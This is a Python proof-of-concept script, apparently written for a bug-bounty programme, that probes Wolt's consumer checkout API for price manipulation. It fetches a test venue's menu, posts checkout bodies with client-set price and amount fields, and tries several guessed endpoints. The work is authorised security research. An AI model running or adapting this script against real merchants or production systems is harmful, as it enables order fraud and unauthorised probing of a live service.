"""Price manipulation PoC using official test venue."""
import requests, json, pprint

H = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Origin': 'https://wolt.com',
    'X-HackerOne-Research': 'pccp',
    'Content-Type': 'application/json',
}

TEST_VENUE_ID = '670e7897e3c56dcc5b5a0989'
VENUE_SLUG = f'test-{TEST_VENUE_ID}-sh0p'

# Step 1: Get venue data
r = requests.get(
    f'https://consumer-api.wolt.com/order-xp/web/v1/venue/slug/{VENUE_SLUG}/dynamic/',
    params={'selected_delivery_method': 'homedelivery'},
    headers=H
)
print(f"[1] Venue dynamic: {r.status_code}")
vd = r.json()
print(f"    Keys: {list(vd.keys())}")
print(f"    venue_raw keys: {list(vd.get('venue_raw', {}).keys())[:15]}")

# Check venue structure
vr = vd.get('venue_raw', {})
print(f"    venue id: {vr.get('id')}")
print(f"    menu keys: {list(vr.get('menu', {}).keys()) if vr.get('menu') else 'NO MENU'}")

# Get menu items
menu = vr.get('menu', {})
menu_items = menu.get('items', [])
print(f"    menu items count: {len(menu_items)}")
if menu_items:
    first = menu_items[0]
    print(f"    first item keys: {list(first.keys())}")
    print(f"    first item: id={first.get('id')}, name={first.get('name')}, price={first.get('baseprice')}")

# Step 2: Get venue static data (contains more item info)
r2 = requests.get(
    f'https://consumer-api.wolt.com/order-xp/web/v1/venue/slug/{VENUE_SLUG}/static/',
    headers=H
)
print(f"\n[2] Venue static: {r2.status_code}")
vs = r2.json()
vs_items = vs.get('venue', {}).get('menu', {}).get('items', []) if 'venue' in vs else vs.get('items', [])
print(f"    static items count: {len(vs_items)}")
if vs_items:
    si = vs_items[0]
    print(f"    first static item keys: {list(si.keys())}")
    print(f"    first: id={si.get('id')}, name={si.get('name')}, price={si.get('baseprice')}")

# Step 3: Try to build checkout with whatever data we have
# First try the standard checkout endpoint
item_id = None
item_name = None
item_price = None

# Try venue dynamic items first
for src_name, src in [('dynamic menu', menu_items), ('static items', vs_items)]:
    if src:
        for item in src[:5]:
            if isinstance(item, dict):
                iid = item.get('id')
                iname = item.get('name') or item.get('title', '')
                iprice = item.get('baseprice') or item.get('price', 0)
                if iid and iprice:
                    item_id = iid
                    item_name = iname
                    item_price = iprice
                    print(f"\n    Using item from {src_name}: id={iid}, name={iname}, price={iprice}")
                    break
    if item_id:
        break

if not item_id:
    print("\n[FAIL] No usable item found. Dumping venue data...")
    print(json.dumps({k: str(v)[:200] for k, v in vd.items()}, indent=2))
    exit()

# Step 4: Minimal checkout attempt - start simple
print(f"\n[3] Checkout attempt with: item_id={item_id}, price={item_price}")
checkout_body = {
    'items': [{
        'id': item_id,
        'name': item_name,
        'count': 1,
        'price': item_price,
        'base_price': item_price,
        'end_amount': item_price,
        'options': [],
        'restrictions': [],
    }],
    'base_price': item_price,
    'end_amount': item_price,
    'supplier_id': TEST_VENUE_ID,
    'selected_delivery_method': 'homedelivery',
    'currency': 'EUR',
    'vendor': 'wolt',
}

r = requests.post('https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout',
                  headers=H, json=checkout_body)
print(f"    Status: {r.status_code}")
if r.status_code == 200:
    d = r.json()
    print(f"    Keys: {list(d.keys())[:15]}")
    pa = d.get('payable_amount', 'N/A')
    print(f"    payable_amount: {pa}")
    # Look for place_order endpoint or next action
    for k in ['place_order', 'actions', 'next_step', 'url', 'order']:
        if k in str(d).lower():
            print(f"    Found '{k}' in response!")

    # Show full response structure (truncated)
    print(f"\n    Response preview:")
    print(json.dumps({k: str(v)[:150] for k, v in d.items()}, indent=2)[:800])
elif r.status_code == 400:
    print(f"    Error: {r.text[:500]}")
else:
    print(f"    Body: {r.text[:300]}")

# Step 5: Try with delivery location
if r.status_code != 200:
    print(f"\n[4] Retry with delivery location...")
    checkout_body['delivery_location'] = {'lat': 60.168142, 'lon': 24.939986}
    r = requests.post('https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout',
                      headers=H, json=checkout_body)
    print(f"    Status: {r.status_code}")
    if r.status_code == 200:
        d = r.json()
        print(f"    payable_amount: {d.get('payable_amount', 'N/A')}")
        print(f"    Keys: {list(d.keys())[:15]}")
    elif r.status_code == 400:
        print(f"    Error: {r.text[:500]}")
    else:
        print(f"    Body: {r.text[:300]}")

# Step 6: Try alternative checkout endpoints
print(f"\n[5] Trying alternative checkout endpoints...")
alt_endpoints = [
    ('POST', '/order-xp/web/v1/pages/checkout'),
    ('POST', '/order-xp/web/v1/checkout'),
    ('POST', '/order-xp/web/v2/checkout'),
    ('POST', '/order-xp/web/v1/order/checkout'),
    ('POST', '/order-xp/web/v1/basket/checkout'),
    ('GET', f'/order-xp/web/v1/venue/slug/{VENUE_SLUG}/checkout/'),
]
for method, ep in alt_endpoints:
    try:
        if method == 'GET':
            r = requests.get(f'https://consumer-api.wolt.com{ep}', headers=H)
        else:
            r = requests.post(f'https://consumer-api.wolt.com{ep}', headers=H, json=checkout_body)
        if r.status_code not in (404, 405):
            print(f"    {method} {ep}: {r.status_code} | {r.text[:120]}")
    except Exception as e:
        print(f"    {method} {ep}: ERROR {e}")

print("\nDONE")
